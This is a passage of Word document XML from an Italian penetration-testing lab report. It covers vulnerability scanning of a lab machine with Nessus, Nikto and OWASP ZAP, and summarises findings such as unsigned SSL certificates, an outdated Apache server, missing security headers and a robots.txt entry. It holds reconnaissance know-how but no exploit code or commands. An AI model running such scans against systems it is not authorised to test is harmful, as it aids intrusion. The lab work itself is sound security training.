                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5274310" cy="1742440"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:r w:rsidRPr="00451291">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251723776" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="3A946D5B" wp14:editId="535C364C">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:posOffset>-34290</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>843280</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5274310" cy="1989455"/>
            <wp:effectExtent l="0" t="0" r="2540" b="0"/>
            <wp:wrapSquare wrapText="bothSides"/>
            <wp:docPr id="141190914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09149" name="Immagine 1" descr="Immagine che contiene testo, schermata, software, Software multimediale&#10;&#10;Descrizione generata automaticamente"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId25"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5274310" cy="1989455"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
            <wp14:sizeRelV relativeFrom="margin">
              <wp14:pctHeight>0</wp14:pctHeight>
            </wp14:sizeRelV>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:r w:rsidRPr="00B67E39">
        <w:t xml:space="preserve">Successivamente è stato utilizzato </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B67E39">
        <w:t>Nessus</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B67E39">
        <w:t xml:space="preserve">, un altro tool per la scansione automatica delle vulnerabilità. Con questo strumento è stata effettuata una scansione di tipo </w:t>
      </w:r>
      <w:r>
        <w:t>Basic</w:t>
      </w:r>
      <w:r w:rsidRPr="00B67E39">
        <w:t>, anche in questo caso la configurazione della scansione prevede l’inserimento dell’indirizzo della macchina da scansionare:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7346D023" w14:textId="25293D6D" w:rsidR="00451291" w:rsidRDefault="00451291" w:rsidP="00D76587"/>
    <w:p w14:paraId="34EC4AFE" w14:textId="375BFD07" w:rsidR="00451291" w:rsidRDefault="00B67E39" w:rsidP="00D76587">
      <w:r w:rsidRPr="00B67E39">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251730944" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="2F9958F4" wp14:editId="44CCC3F5">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>4947285</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>408940</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="171823" cy="102658"/>
                <wp:effectExtent l="0" t="0" r="19050" b="12065"/>
                <wp:wrapNone/>
                <wp:docPr id="730530649" name="Rettangolo 3"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="171823" cy="102658"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="25400" cap="flat" cmpd="sng" algn="ctr">
                          <a:solidFill>
                            <a:srgbClr val="00B0F0"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                        </a:ln>
                        <a:effectLst/>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="325E3078" w14:textId="77777777" w:rsidR="00451291" w:rsidRDefault="00451291" w:rsidP="004512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958F4" id="_x0000_s1035" style="position:absolute;left:0;text-align:left;margin-left:389.55pt;margin-top:32.2pt;width:13.55pt;height:8.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vp/UQIAAJwEAAAOAAAAZHJzL2Uyb0RvYy54bWysVE1v2zAMvQ/YfxB0X2xn6VdQp8haZBgQ&#10;tAXaoWdFlmIDsqhRSuzs14+Snabrdhp2UUiRfiIfH3N907eG7RX6BmzJi0nOmbISqsZuS/79efXp&#10;kjMfhK2EAatKflCe3yw+frju3FxNoQZTKWQEYv28cyWvQ3DzLPOyVq3wE3DKUlADtiKQi9usQtER&#10;emuyaZ6fZx1g5RCk8p5u74YgXyR8rZUMD1p7FZgpOdUW0onp3MQzW1yL+RaFqxs5liH+oYpWNJYe&#10;fYW6E0GwHTZ/QLWNRPCgw0RCm4HWjVSpB+qmyN9181QLp1IvRI53rzT5/wcr7/dP7hGJhs75uScz&#10;dtFrbOMv1cf6RNbhlSzVBybpsrgoLqefOZMUKvLp+dllJDM7fezQh68KWhaNkiPNIlEk9msfhtRj&#10;SnzLwqoxJs3DWNaVfHo2y2lkUpAstBGBzNZVJfd2y5kwW9KbDJggPZimip9HII/bza1Bthdx5vmX&#10;fJXGTJX9lhbfvhO+HvJSaGzA2AijknrGUk/kRCv0m541VMpV/CLebKA6PCJDGATmnVw1hL8WPjwK&#10;JEVRI7Ql4YEObYC6g9HirAb8+bf7mE+DpihnHSmUOv+xE6g4M98sSeCqmM2ipJMzO7uYkoNvI5u3&#10;Ebtrb4EIKWgfnUxmzA/maGqE9oWWaRlfpZCwkt4eOB6d2zBsDq2jVMtlSiMZOxHW9snJCB6Zi8w+&#10;9y8C3Tj6QJq5h6OaxfydAobcQQPLXQDdJHmceCVZRYdWIAlsXNe4Y2/9lHX6U1n8AgAA//8DAFBL&#10;AwQUAAYACAAAACEAfkgtjd8AAAAJAQAADwAAAGRycy9kb3ducmV2LnhtbEyPy2rDMBBF94X+g5hC&#10;d42cB47jWA4lEOgihebxAYo1sU2tkZGUxPn7TrtpdjPM4c65xWqwnbiiD60jBeNRAgKpcqalWsHx&#10;sHnLQISoyejOESq4Y4BV+fxU6Ny4G+3wuo+14BAKuVbQxNjnUoaqQavDyPVIfDs7b3Xk1dfSeH3j&#10;cNvJSZKk0uqW+EOje1w3WH3vL1aB3VYLHz/q6fFrmt237SHKs/1U6vVleF+CiDjEfxh+9VkdSnY6&#10;uQuZIDoF8/lizKiCdDYDwUCWpBMQp78BZFnIxwblDwAAAP//AwBQSwECLQAUAAYACAAAACEAtoM4&#10;kv4AAADhAQAAEwAAAAAAAAAAAAAAAAAAAAAAW0NvbnRlbnRfVHlwZXNdLnhtbFBLAQItABQABgAI&#10;AAAAIQA4/SH/1gAAAJQBAAALAAAAAAAAAAAAAAAAAC8BAABfcmVscy8ucmVsc1BLAQItABQABgAI&#10;AAAAIQCA5vp/UQIAAJwEAAAOAAAAAAAAAAAAAAAAAC4CAABkcnMvZTJvRG9jLnhtbFBLAQItABQA&#10;BgAIAAAAIQB+SC2N3wAAAAkBAAAPAAAAAAAAAAAAAAAAAKsEAABkcnMvZG93bnJldi54bWxQSwUG&#10;AAAAAAQABADzAAAAtwUAAAAA&#10;" filled="f" strokecolor="#00b0f0" strokeweight="2pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="325E3078" w14:textId="77777777" w:rsidR="00451291" w:rsidRDefault="00451291" w:rsidP="00451291">
                      <w:pPr>
                        <w:jc w:val="center"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap anchorx="margin"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidRPr="00451291">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251724800" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="6082AE57" wp14:editId="6B0B22F1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:align>right</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>263736</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5274310" cy="278765"/>
            <wp:effectExtent l="0" t="0" r="2540" b="6985"/>
            <wp:wrapSquare wrapText="bothSides"/>
            <wp:docPr id="1143501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0104" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId26"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5274310" cy="278765"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4973F0DC" w14:textId="4F49221A" w:rsidR="003023C4" w:rsidRDefault="003023C4" w:rsidP="00D76587">
      <w:r w:rsidRPr="003023C4">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="43AE2233" wp14:editId="41F6E27F">
            <wp:extent cx="5274310" cy="1663700"/>
            <wp:effectExtent l="0" t="0" r="2540" b="0"/>
            <wp:docPr id="312725735" name="Immagine 1" descr="Immagine che contiene schermata,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5735" name="Immagine 1" descr="Immagine che contiene schermata, software, Software multimediale, Software per la grafica&#10;&#10;Descrizione generata automaticamente"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId27"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5274310" cy="1663700"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="29223BE9" w14:textId="4A223712" w:rsidR="003974D7" w:rsidRDefault="003023C4" w:rsidP="003974D7">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="003023C4">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="46107D2D" wp14:editId="78B95786">
            <wp:extent cx="5274310" cy="578485"/>
            <wp:effectExtent l="0" t="0" r="2540" b="0"/>
            <wp:docPr id="15968548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54833" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId28"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5274310" cy="578485"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="003974D7" w:rsidRPr="00B01334">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Figura </w:t>
      </w:r>
      <w:r w:rsidR="003974D7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>9</w:t>
      </w:r>
      <w:r w:rsidR="003974D7" w:rsidRPr="00B01334">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="003974D7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Configurazione, output e vulnerabilità </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="003974D7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Nessus</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="665B8950" w14:textId="373937E6" w:rsidR="003023C4" w:rsidRPr="00D41B32" w:rsidRDefault="003023C4" w:rsidP="00D76587">
      <w:r>
        <w:t xml:space="preserve">Possiamo notare che sono state identificate 26 vulnerabilità, dove la maggior parte riguardano il livello </w:t>
      </w:r>
      <w:r w:rsidRPr="003023C4">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>info</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="003023C4">
        <w:t xml:space="preserve"> cioè vulnerabilità che forniscono semplicemente informazioni ad esempio sul sistema operativo, sulle versioni dei servizi e altro.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Vengono riportate anche </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>2</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> vulnerabilità che riguardano </w:t>
      </w:r>
      <w:r w:rsidR="00D41B32">
        <w:t xml:space="preserve">il livello </w:t>
      </w:r>
      <w:r w:rsidR="00D41B32" w:rsidRPr="00D41B32">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>medio</w:t>
      </w:r>
      <w:r w:rsidR="00D41B32">
        <w:t xml:space="preserve">, cioè vulnerabilità che riguardano </w:t>
      </w:r>
      <w:r w:rsidR="003974D7">
        <w:t>la firma dei certificati SSL, che non sono firmati da autorità riconosciute. Tale vulnerabilità permette ad un attaccante di effettuare un man-in-the-middle verso la macchina target.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57D18F6A" w14:textId="77777777" w:rsidR="003974D7" w:rsidRDefault="003974D7" w:rsidP="00D76587"/>
    <w:p w14:paraId="3BFE3382" w14:textId="5A41F3C1" w:rsidR="007652F3" w:rsidRDefault="003974D7" w:rsidP="00D76587">
      <w:r w:rsidRPr="008200C7">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251735040" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="046D1346" wp14:editId="2F3118DE">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:align>left</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>274955</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5273040" cy="2909570"/>
            <wp:effectExtent l="0" t="0" r="3810" b="5080"/>
            <wp:wrapSquare wrapText="bothSides"/>
            <wp:docPr id="11813874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7418" name="Immagine 1" descr="Immagine che contiene testo, schermata, Carattere, numero&#10;&#10;Descrizione generata automaticamente"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId29"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5273040" cy="2909570"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00B01334">
        <w:t xml:space="preserve">Tramite i tool </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00B01334" w:rsidRPr="00B01334">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>nikto</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00B01334">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0003027C">
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r w:rsidR="0003027C" w:rsidRPr="0003027C">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>OWASP ZAP</w:t>
      </w:r>
      <w:r w:rsidR="0003027C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B01334">
        <w:t xml:space="preserve">effettuiamo </w:t>
      </w:r>
      <w:r w:rsidR="0003027C">
        <w:t xml:space="preserve">la </w:t>
      </w:r>
      <w:r w:rsidR="0003027C" w:rsidRPr="0003027C">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>WEB</w:t>
      </w:r>
      <w:r w:rsidR="008200C7">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="008200C7" w:rsidRPr="008200C7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Vulnarability</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="008200C7" w:rsidRPr="008200C7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> Scanner</w:t>
      </w:r>
      <w:r w:rsidR="00B01334">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D18BBE5" w14:textId="78ED239E" w:rsidR="003974D7" w:rsidRPr="003974D7" w:rsidRDefault="005D7D15" w:rsidP="003974D7">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B01334">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Figura </w:t>
      </w:r>
      <w:r w:rsidR="00D02E6F" w:rsidRPr="00B01334">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
      <w:r w:rsidRPr="00B01334">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">: Output del tool </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B01334">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Nikto</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="44D87178" w14:textId="62ACFB4D" w:rsidR="005D7D15" w:rsidRPr="00B01334" w:rsidRDefault="005D7D15" w:rsidP="00D76587"/>
    <w:p w14:paraId="306C0A6E" w14:textId="5E6F615D" w:rsidR="008200C7" w:rsidRDefault="008200C7" w:rsidP="00D76587">
      <w:r>
        <w:t>Cosa capiamo dall’output</w:t>
      </w:r>
      <w:r w:rsidR="005074DA">
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E61DFC5" w14:textId="374113AA" w:rsidR="005074DA" w:rsidRDefault="005074DA">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Ci viene data la versione del </w:t>
      </w:r>
      <w:r w:rsidRPr="005074DA">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Server Apache 2.3.38</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:t>e ci viene detto che tale versione è obsoleta.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42D2DB4C" w14:textId="2DAA0329" w:rsidR="00352443" w:rsidRDefault="005074DA">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00C35D2F">
        <w:t>L’</w:t>
      </w:r>
      <w:r w:rsidR="00C35D2F" w:rsidRPr="00C35D2F">
        <w:t xml:space="preserve">intestazione </w:t>
      </w:r>
      <w:r w:rsidRPr="00C35D2F">
        <w:t>anti-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C35D2F">
        <w:t>clickjacking</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C35D2F">
        <w:t xml:space="preserve"> X-Frame-Options non è presente</w:t>
      </w:r>
      <w:r w:rsidR="00AE46DD">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="00352443">
        <w:t>essa consente non consente il rendering di una pagina in un frame.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="481E338F" w14:textId="1AD9CA24" w:rsidR="00C35D2F" w:rsidRPr="00352443" w:rsidRDefault="00352443">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00352443">
        <w:t>L’intestazione</w:t>
      </w:r>
      <w:r w:rsidR="00C35D2F" w:rsidRPr="00352443">
        <w:t xml:space="preserve"> X-Content-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00C35D2F" w:rsidRPr="00352443">
        <w:t>Type</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00C35D2F" w:rsidRPr="00352443">
        <w:t>-Options</w:t>
      </w:r>
      <w:r w:rsidRPr="00352443">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00352443">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>può portare a problemi di sicurezza come attacchi XSS, se l’</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00352443">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>header</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00352443">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> non è presente il browser tenta di capire da solo qual è il tipo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00352443">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>del contenuto della risposta e come gestirla</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67519CCB" w14:textId="34902B47" w:rsidR="00C35D2F" w:rsidRDefault="00C35D2F">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00C35D2F">
        <w:t>Ci vengono date olt</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r w:rsidRPr="00C35D2F">
        <w:t>e i</w:t>
      </w:r>
      <w:r>
        <w:t>nformazioni sulla directory /ona/, dove: ci viene detto che non ci sono dei flag attivati e che al suo interno possiamo trovare un file robots.txt, che restituisce un codice http.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A324652" w14:textId="365F63E8" w:rsidR="00C35D2F" w:rsidRPr="00C35D2F" w:rsidRDefault="00C35D2F">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Ci viene detto anche nel file robots.txt abbiamo una voce da vedere.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65E2315C" w14:textId="77777777" w:rsidR="005D7D15" w:rsidRDefault="005D7D15" w:rsidP="00D76587"/>
    <w:p w14:paraId="3642D124" w14:textId="0469BCE2" w:rsidR="008200C7" w:rsidRPr="005D7D15" w:rsidRDefault="008200C7" w:rsidP="00D76587">
      <w:r>
        <w:t xml:space="preserve">Successivamente per completezza utilizziamo il tool </w:t>
      </w:r>
      <w:r w:rsidRPr="008200C7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>OWASP ZAP</w:t>
      </w:r>
      <w:r w:rsidR="005D7D15">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="005D7D15">
        <w:t xml:space="preserve">Dopo aver effettuato l’aggiornamento dei </w:t>
      </w:r>
      <w:r w:rsidR="005D7D15" w:rsidRPr="005D7D15">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>tool</w:t>
      </w:r>
      <w:r w:rsidR="005D7D15">
        <w:t xml:space="preserve"> al suo interno andiamo a effettuare una </w:t>
      </w:r>
      <w:r w:rsidR="005D7D15" w:rsidRPr="005D7D15">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">Scansione </w:t>
      </w:r>
      <w:r w:rsidR="005D7D15">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r w:rsidR="005D7D15" w:rsidRPr="005D7D15">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>utomatica</w:t>
      </w:r>
      <w:r w:rsidR="005D7D15">
        <w:t xml:space="preserve"> ovviamente sulla pagina </w:t>
      </w:r>
      <w:hyperlink r:id="rId30" w:history="1">
        <w:r w:rsidR="005D7D15" w:rsidRPr="00D97B10">
          <w:rPr>
            <w:rStyle w:val="Collegamentoipertestuale"/>
            <w:i/>
            <w:iCs/>
          </w:rPr>
          <w:t>http://10.0.2.4/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="005D7D15">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="005D7D15">
        <w:t>Ne viene riportato l’output in Figura 8.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C39A8F8" w14:textId="77777777" w:rsidR="005D7D15" w:rsidRPr="005D7D15" w:rsidRDefault="005D7D15" w:rsidP="00D76587">
      <w:pPr>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0DEC420B" w14:textId="348567C5" w:rsidR="008200C7" w:rsidRPr="00D02E6F" w:rsidRDefault="005D7D15" w:rsidP="005D7D15">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="005D7D15">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="026D4FB0" wp14:editId="075A58A7">
            <wp:extent cx="5274310" cy="2405380"/>
            <wp:effectExtent l="0" t="0" r="2540" b="0"/>
            <wp:docPr id="2066749651"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49651" name="Immagine 1" descr="Immagine che contiene testo, schermata, software, numero&#10;&#10;Descrizione generata automaticamente"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId31"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5274310" cy="2405380"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
